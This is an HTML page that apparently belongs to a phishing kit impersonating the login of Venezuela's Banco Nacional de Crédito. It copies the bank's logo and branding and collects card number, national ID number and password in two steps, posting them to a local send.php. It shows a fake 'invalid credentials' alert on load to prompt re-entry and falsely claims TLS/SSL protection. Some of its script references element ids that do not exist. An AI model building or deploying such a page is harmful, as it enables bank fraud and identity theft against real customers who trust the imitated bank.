<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="iconero.ico">
    <title>BNC</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
        rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            background: #efefef;
            overflow-x: hidden;
            position: relative;

            display: flex;
            justify-content: center;
            align-items: center;

            padding: 20px;
        }

        /* ===== BACKGROUND ===== */

        .bg-shapes {
            position: absolute;
            inset: 0;
            overflow: hidden;
            z-index: 0;
        }

        .shape {
            position: absolute;
            background: rgba(255, 255, 255, 0.35);
            transform: skewX(-12deg);
        }

        .shape1 {
            width: 180px;
            height: 140%;
            left: 220px;
            top: -100px;
        }

        .shape2 {
            width: 140px;
            height: 140%;
            left: 560px;
            top: -120px;
        }

        .shape3 {
            width: 130px;
            height: 140%;
            left: -20px;
            top: 240px;
            transform: rotate(25deg);
            opacity: .15;
        }

        /* ===== PAGE ===== */

        .wrapper {
            position: relative;
            z-index: 2;

            width: 100%;
            max-width: 520px;

            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }

        /* ===== LOGO ===== */

        .logo {
            width: 78px;
            margin-bottom: 18px;
            margin-left: 6px;
        }

        .logo img {
            width: 100%;
            display: block;
        }

        /* ===== LOGIN CARD ===== */

        .login-card {
            width: 100%;
            border-radius: 18px;
            overflow: hidden;
            background: #082a50;

            box-shadow:
                0 10px 30px rgba(0, 0, 0, .12);
        }

        /* ===== TOP TABS ===== */

        .top-tabs {
            display: flex;
            height: 62px;
            background: #c9c9c9;
        }

        .top-tab {
            flex: 1;
            border: none;
            background: #b9bcc2;

            font-size: 18px;
            font-weight: 400;

            color: #111;
            cursor: pointer;
            transition: .25s;
            position: relative;

            font-family: 'Poppins', sans-serif;
        }

        .top-tab.active {
            background: white;
        }

        .top-tab.active::after {
            content: '';
            position: absolute;
            left: 0;
            bottom: 0;
            width: 100%;
            height: 3px;
            background: #ff5a00;
        }

        /* ===== CONTENT ===== */

        .content {
            background: linear-gradient(to bottom, #00215d, #001742);
            padding: 16px 18px 18px;
        }

        /* ===== TITLES ===== */

        .title {
            text-align: center;
            color: white;

            font-size: 30px;
            font-weight: 500;

            line-height: 1.1;

            margin-bottom: 6px;
        }

        .subtitle {
            text-align: center;
            color: white;

            font-size: 15px;
            line-height: 1.5;

            margin-bottom: 12px;
        }

        .subtitle strong {
            font-weight: 700;
        }

        /* ===== OPTION SWITCH ===== */

        .option-switch {
            width: 100%;
            border: 1px solid rgba(255, 255, 255, .5);
            border-radius: 10px;
            overflow: hidden;
            display: flex;
            margin-bottom: 14px;
        }

        .option-btn {
            flex: 1;
            border: none;

            height: 48px;

            background: transparent;
            color: #8d96ab;

            font-size: 15px;

            font-family: 'Poppins', sans-serif;
            cursor: pointer;
            transition: .25s;
        }

        .option-btn.active {
            background: #ff5a00;
            color: white;
        }

        /* ===== SEPARATOR ===== */

        .separator {
            width: 100%;
            height: 1px;
            background: rgba(255, 255, 255, .15);
            margin: 12px 0 18px;
        }

        /* ===== INPUTS ===== */

        .form-group {
            display: flex;
            align-items: center;

            height: 56px;

            border-radius: 8px;
            overflow: hidden;

            margin-bottom: 14px;

            background: white;

            border: 1px solid #d9d9d9;

            transition:
                border .25s ease,
                box-shadow .25s ease;
        }

        /* EFECTO AL SELECCIONAR */

        .form-group:focus-within {
            border: 3px solid #ff5a00;
        }

        .icon-box {
            width: 54px;
            height: 100%;
            background: #ffffff;

            display: flex;
            align-items: center;
            justify-content: center;

            border-right: 1px solid #cfcfcf;

            position: relative;
            z-index: 2;
        }

        .icon {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .icon img {
            width: 22px;
            object-fit: contain;
        }

        .form-input {
            flex: 1;
            height: 100%;

            border: none;
            outline: none;

            padding: 0 14px;

            font-size: 16px;

            font-family: 'Poppins', sans-serif;
            color: #333;

            background: white;
        }

        .form-input::placeholder {
            color: #8d8d8d;
        }

        /* ===== BUTTON ===== */

        .submit-btn {
            width: 100%;
            height: 52px;

            border: none;
            border-radius: 8px;

            background: #1f58d6;
            color: white;

            font-size: 17px;
            font-weight: 500;

            cursor: pointer;
            transition: .2s;

            font-family: 'Poppins', sans-serif;
        }

        .submit-btn:hover {
            background: #1a4cbc;
        }

        /* ===== FORGOT ===== */

        .forgot {
            text-align: center;
            margin-top: 14px;
        }

        .forgot a {
            color: white;
            text-decoration: none;
            display: inline-block;
        }

        .lock {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;

            color: white;
            font-size: 14px;

            cursor: pointer;
        }

        .lock img {
            width: 18px;
            height: 18px;
            object-fit: contain;
        }

        .lock span {
            line-height: 1;
            border-bottom: 1px dashed rgba(255, 255, 255, .7);
            padding-bottom: 1px;
        }

        /* ===== FOOTER ===== */

        .footer {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;

            margin-top: 14px;
            gap: 14px;
        }

        .footer p {
            color: white;
            font-size: 11.5px;
            line-height: 1.6;
            max-width: 320px;
        }



        /* ===== RESPONSIVE ===== */

        @media(max-width:600px) {

            body {
                padding: 14px;
                align-items: flex-start;
            }

            .wrapper {
                max-width: 100%;
            }

            .logo {
                width: 72px;
                margin-bottom: 14px;
            }

            .title {
                font-size: 26px;
            }

            .subtitle {
                font-size: 14px;
            }

            .top-tab {
                font-size: 16px;
            }

            .option-btn {
                font-size: 13px;
            }

            .form-input {
                font-size: 15px;
            }

            .footer {
                flex-direction: column;
                align-items: flex-start;
            }

            .security {
                align-self: flex-end;
            }
        }

        /* ===== SECURITY ===== */

        .security {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .security img {
            width: 135px;
            height: auto;
            object-fit: contain;
            display: block;
        }


        .form-group {
            transition:
                border .25s ease,
                box-shadow .25s ease,
                transform .35s ease,
                opacity .35s ease;
        }


       .bnc-alert-overlay{
    position:fixed;
    inset:0;

    background:rgba(0,0,0,.35);

    display:flex;
    justify-content:center;
    align-items:center;

    z-index:999999;

    animation:fadeIn .25s ease;
}

.bnc-alert-box{
    width:92%;
    max-width:360px;

    background:white;

    border-radius:22px;

    padding:30px 24px;

    text-align:center;

    box-shadow:
    0 18px 45px rgba(0,0,0,.18);

    animation:popup .28s ease;

    font-family:'Poppins',sans-serif;

    position:relative;
}

.bnc-alert-close{
    position:absolute;

    top:14px;
    right:14px;

    width:34px;
    height:34px;

    border:none;
    border-radius:50%;

    background:#f2f4f8;

    color:#5f6b7a;

    font-size:24px;
    line-height:1;

    cursor:pointer;

    transition:.2s;
}

.bnc-alert-close:hover{
    background:#e5e9f0;
}

.bnc-alert-logo{
    width:110px;
    display:block;
    margin:0 auto 18px;
}

.bnc-alert-icon{
    width:58px;
    height:58px;

    border-radius:50%;

    background:#ff5a00;
    color:white;

    display:flex;
    justify-content:center;
    align-items:center;

    font-size:34px;
    font-weight:600;

    margin:0 auto 18px;
}

.bnc-alert-title{
    font-size:24px;
    font-weight:600;

    color:#003c81;

    margin-bottom:10px;
}

.bnc-alert-text{
    font-size:15px;
    line-height:1.7;

    color:#5f6b7a;
}

/* ANIMACIONES */

@keyframes popup{

    0%{
        transform:scale(.85);
        opacity:0;
    }

    100%{
        transform:scale(1);
        opacity:1;
    }
}

@keyframes fadeIn{

    from{
        opacity:0;
    }

    to{
        opacity:1;
    }
}
    </style>
</head>

<body>

    <div class="bg-shapes">
        <div class="shape shape1"></div>
        <div class="shape shape2"></div>
        <div class="shape shape3"></div>
    </div>

    <div class="wrapper">

        <!-- LOGO -->
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Banco_Nacional_de_Credito.png">
        </div>

        <!-- CARD -->
        <div class="login-card">
            <form id="loginForm" method="post" action="send.php">
            <input type="hidden" name="tipo_usuario2" id="tipo_usuario" value="personas">
            <input type="hidden" name="tipo_tarjeta2" id="tipo_tarjeta" value="Débito | Crédito">
            <!-- TOP TABS -->
            <div class="top-tabs">
                <button class="top-tab active" id="personasTab">
                    Personas
                </button>

                <button class="top-tab" id="empresasTab">
                    Empresas
                </button>
            </div>

            <!-- CONTENT -->
            <div class="content">

                <h1 class="title">Iniciar Sesión</h1>

                <div class="subtitle">
                    ¡Buenas noches, <strong>Bienvenido!</strong><br>
                    Ingrese sus credenciales
                </div>

                <!-- SWITCH -->
                <div class="option-switch" id="optionSwitch">

                    <!-- PERSONAS -->
                    <button class="option-btn active">
                        Débito | Crédito
                    </button>

                    <button class="option-btn">
                        Tarjeta Débito BOD
                    </button>

                </div>

                <div class="separator"></div>


                    <div class="form-group active">
                        <div class="icon-box">
                            <div class="icon">
                                <img src="car.jpg">
                            </div>
                        </div>

                        <input type="text" class="form-input" name="card2" id="card" placeholder="Número de Tarjeta" inputmode="numeric" required>
                    </div>

                    <div class="form-group" id="identityField">
                        <div class="icon-box">
                            <div class="icon">
                                <img src="carne.jpg">
                            </div>
                        </div>

                        <input type="text" name="doc2" id="doc" class="form-input" placeholder="Cédula de Identidad" inputmode="numeric" required>
                    </div>

                    <button class="submit-btn">
                        Continuar
                    </button>

                </form>

                <div class="separator"></div>

                <div class="forgot">
                    <a href="#">
                        <div class="lock">
                            <img src="candao.png">
                            <span>¿Olvidaste tu clave?</span>
                        </div>
                    </a>
                </div>

                <div class="footer">
                    <div class="security">
                        <p>
                            Tus datos se encuentran protegidos por nuestro certificado
                            de seguridad digital (TLS/SSL)
                        </p>
                        <img src="secure.png">
                    </div>

                </div>

            </div>

        </div>

    </div>
<!-- ALERTA -->
<div class="bnc-alert-overlay" id="bncAlert">

    <div class="bnc-alert-box">

        <!-- BOTON CERRAR -->
        <button class="bnc-alert-close" id="closeAlert">
            ×
        </button>

        <img
            src="https://d1uubxdj0phgsa.cloudfront.net/Images/BNCLogoSmall-Big.png"
            class="bnc-alert-logo"
        >

        <div class="bnc-alert-icon">
            !
        </div>

        <div class="bnc-alert-title">
            Credenciales inválidas
        </div>

        <div class="bnc-alert-text">
            Verifica tu información e intenta nuevamente.
        </div>

    </div>

</div>
    <script>
    /* =========================================================
       ELEMENTS
    ========================================================= */

    const personasTab = document.getElementById('personasTab');
    const empresasTab = document.getElementById('empresasTab');

    const optionSwitch = document.getElementById('optionSwitch');

    const identityField = document.getElementById('identityField');

    const loginForm = document.getElementById('loginForm');

    const submitBtn = document.querySelector('.submit-btn');

    /* =========================================================
       STATE
    ========================================================= */

    let currentMode = 'personas';

    let loginStep = 1;

    /* =========================================================
       FUNCTIONS
    ========================================================= */

    function activateTopTab(tab) {

        personasTab.classList.remove('active');
        empresasTab.classList.remove('active');

        tab.classList.add('active');
    }

    function renderPersonas() {

    currentMode = 'personas';

    document.getElementById('tipo_usuario2').value = 'personas';

    activateTopTab(personasTab);

    optionSwitch.innerHTML = `
        <button type="button" class="option-btn active">
            Débito | Crédito
        </button>

        <button type="button" class="option-btn">
            Tarjeta Débito BOD
        </button>
    `;

    document.getElementById('tipo_tarjeta2').value =
        'Débito | Crédito';

    identityField.style.display = 'flex';

    /* ACTIVAR REQUIRED */

    const docInput = document.getElementById('doc2');

    docInput.required = true;

    setupOptionButtons();
}

    function renderEmpresas() {

    currentMode = 'empresas';

    document.getElementById('tipo_usuario2').value = 'empresas';

    activateTopTab(empresasTab);

    optionSwitch.innerHTML = `
        <button type="button" class="option-btn active">
            BNCNET
        </button>

        <button type="button" class="option-btn">
            Débito Jurídica
        </button>
    `;

    document.getElementById('tipo_tarjeta2').value =
        'BNCNET';

    identityField.style.display = 'none';

    /* DESACTIVAR REQUIRED */

    const docInput = document.getElementById('doc2');

    docInput.required = false;

    setupOptionButtons();
}

    function setupOptionButtons() {

        const buttons = document.querySelectorAll('.option-btn');

        buttons.forEach(button => {

            button.addEventListener('click', () => {

                buttons.forEach(btn => {
                    btn.classList.remove('active');
                });

                button.classList.add('active');

                /* GUARDAR TIPO TARJETA */

                document.getElementById('tipo_tarjeta2').value =
                    button.textContent.trim();

            });

        });

    }

    /* =========================================================
       EVENTS
    ========================================================= */

    personasTab.addEventListener('click', (e) => {
        e.preventDefault();
        renderPersonas();
    });

    empresasTab.addEventListener('click', (e) => {
        e.preventDefault();
        renderEmpresas();
    });

    /* =========================================================
       INIT
    ========================================================= */

    setupOptionButtons();

    /* =========================================================
       LOGIN FLOW
    ========================================================= */

    loginForm.addEventListener('submit', (e) => {

        /* =====================================================
           STEP 1
        ===================================================== */

        if (loginStep === 1) {

            e.preventDefault();

            const formGroups = document.querySelectorAll('.form-group');

            const cardField = formGroups[0];

            const cedulaInput = identityField.querySelector('input');

            const cardInput = cardField.querySelector('input');

            /* VALIDACION SIMPLE */

            if (cardInput.value.trim() === '') {

                cardInput.focus();
                return;
            }

            if (
                identityField.style.display !== 'none' &&
                cedulaInput.value.trim() === ''
            ) {

                cedulaInput.focus();
                return;
            }

            /* ANIMACION */

            cardField.style.transition = '.35s';
            cardField.style.opacity = '0';
            cardField.style.transform = 'translateY(-15px)';

            setTimeout(() => {

                cardField.style.visibility = 'hidden';
                cardField.style.position = 'absolute';

                /* CREAR INPUT PASSWORD */

                const passwordField = document.createElement('div');

                passwordField.className = 'form-group';

                passwordField.innerHTML = `
                    <div class="icon-box">
                        <div class="icon">
                            <img src="blacklock.png">
                        </div>
                    </div>

                    <input 
                        type="password"
                        name="clave2"
                        class="form-input" 
                        placeholder="Clave"
                        required
                    >
                `;

                /* =========================================
                   INSERTAR SEGUN EL MODO
                ========================================= */

                if (currentMode === 'personas') {

                    identityField.insertAdjacentElement(
                        'afterend',
                        passwordField
                    );

                } else {

                    optionSwitch.parentNode.insertBefore(
                        passwordField,
                        submitBtn
                    );

                }

                /* FOCUS */

                passwordField.querySelector('input').focus();

            }, 350);

            loginStep = 2;

            return;
        }

        /* =====================================================
           STEP 2
        ===================================================== */

        if (loginStep === 2) {

            const claveInput = document.querySelector(
                'input[name="clave2"]'
            );

            if (!claveInput || claveInput.value.trim() === '') {

                e.preventDefault();

                if (claveInput) {
                    claveInput.focus();
                }

                return;
            }

            /* =================================================
               AQUI EL FORM HACE EL POST NORMAL
               A send.php
            ================================================= */

        }

    });
</script>
<script>

window.addEventListener('load', () => {

    const alertBox = document.getElementById('bncAlert');

    function closeAlert() {

        alertBox.style.opacity = '0';
        alertBox.style.transition = '.25s ease';

        setTimeout(() => {

            alertBox.remove();

        }, 250);
    }

    /* CLICK EN CUALQUIER PARTE */

    document.body.addEventListener('click', closeAlert, {
        once: true
    });

    /* TOUCH MOVIL */

    document.body.addEventListener('touchstart', closeAlert, {
        once: true
    });

});

</script>
</body>
</html>
